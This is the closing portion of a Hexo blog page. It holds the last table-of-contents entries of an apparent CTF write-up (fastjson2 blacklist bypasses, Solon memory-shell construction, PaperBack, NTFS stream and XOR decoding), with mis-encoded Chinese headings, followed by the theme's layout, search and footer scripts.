class="toc-item toc-level-2"><a class="toc-link" href="#5-3-XString-%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">5.3 XString ç»•è¿‡é»‘åå•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-%E4%BA%8C%E6%AC%A1%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%BB%95%E8%BF%87-fastjson2-%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">5.4 äºŒæ¬¡åŠ¨æ€ä»£ç†ç»•è¿‡ fastjson2 é»‘åå•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-5-%E5%85%B6%E4%BD%99%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E6%9E%84%E9%80%A0"><span class="toc-text">5.5 å…¶ä½™åºåˆ—åŒ–æ•°æ®æ„é€ </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-6-solon-%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0"><span class="toc-text">5.6 solon å†…å­˜é©¬æ„é€ </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-PaperBack"><span class="toc-text">6. PaperBack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-PaperBack-%E8%A7%A3%E5%AF%86"><span class="toc-text">6.1 PaperBack è§£å¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-Whitespace-Language-%E8%A7%A3%E5%AF%86"><span class="toc-text">6.2 Whitespace Language è§£å¯†</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E9%87%8F%E5%AD%90%E5%8F%8C%E7%94%9F%E5%BD%B1"><span class="toc-text">7. é‡å­åŒç”Ÿå½±</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-NTFS-%E6%95%B0%E6%8D%AE%E6%B5%81%E8%A7%A3%E5%AF%86"><span class="toc-text">7.1 NTFS æ•°æ®æµè§£å¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-%E5%AF%86%E9%92%A5%E8%A7%A3%E5%AF%86"><span class="toc-text">7.2 å¯†é’¥è§£å¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-3-%E5%BC%82%E6%88%96%E8%A7%A3%E5%AF%86"><span class="toc-text">7.3 å¼‚æˆ–è§£å¯†</span></a></li></ol></li></ol>
        
      </div>
    </div>
  </div>

  
<script src="../../js/catalog.js"></script>




    
  </div>
  <script>
    (() => {
      function compensate() {
        const bodyBox = document.querySelector('.zoom-wrap');
        if (bodyBox) {
          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
          bodyBox.style.marginBottom = `-${gapY}px`;
        }

        const catBox = document.querySelector('.catalog-zoom');
        if (catBox) {
          const rect = catBox.getBoundingClientRect();
          const gapX = catBox.offsetWidth  - rect.width;
          const gapY = catBox.offsetHeight - rect.height;

          const list = catBox.querySelector('.catalog-content');
          if (list) {
            const orig = list.dataset.origHeight
                      ? parseFloat(list.dataset.origHeight)
                      : parseFloat(getComputedStyle(list).height);
            list.dataset.origHeight = orig;
            list.style.height       = (orig + gapY) + 'px';
          }

          catBox.style.marginRight  = `-${gapX}px`;
          catBox.style.marginBottom = `-${gapY}px`;
        }
      }

      function hookImages(root = document) {
        root.querySelectorAll('img').forEach(img => {
          if (img.dataset._scaledFix) return;
          img.dataset._scaledFix = 1;
          img.addEventListener('load', compensate, {once: true});
        });
      }

      addEventListener('DOMContentLoaded', () => {
        compensate();
        hookImages();
      });

      addEventListener('resize', compensate);

      const observer = new MutationObserver(muts => {
        muts.forEach(m => {
          m.addedNodes.forEach(n => {
            if (n.nodeType !== 1) return;
            if (n.tagName === 'IMG') hookImages(n.parentNode);
            else hookImages(n);
          });
        });
      });

      const wrap = document.querySelector('.zoom-wrap');
      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
    })();
  </script>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" href="https://github.com/security-s3ven">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/security-s3ven">Copyright Â© 2023-2026 s3ven</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="../../js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="../../js/colorscheme.js"></script>





        

      </div>
    </div>
  </body>
</html>
